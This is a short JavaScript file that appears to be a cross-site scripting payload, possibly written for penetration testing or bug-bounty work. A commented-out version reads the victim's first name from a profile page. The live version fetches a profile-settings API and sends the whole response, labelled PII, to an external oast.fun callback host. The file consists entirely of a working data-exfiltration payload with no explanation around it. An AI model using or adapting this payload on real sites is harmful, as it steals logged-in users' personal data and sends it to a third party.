//xhr=new XMLHttpRequest();
//xhr.open('GET','/ProfileSettings#general');
//xhr.withCredentials=true;
//xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
//xhr.send();

const xhr = new XMLHttpRequest();
xhr.open("GET", "/api/applicationData/forProfileSettings", true); 
xhr.onload = function() {
  if (xhr.status === 200) {
    const response = JSON.parse(xhr.responseText);
    const firstName = response.generalInfo?.contactInfo?.name?.firstName;
    if (firstName && firstName.trim() !== "") {
    xxhr=new XMLHttpRequest();
    xxhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");
    xxhr.send(`PII=${xhr.responseText}`);
    }
  }
};
xhr.send();
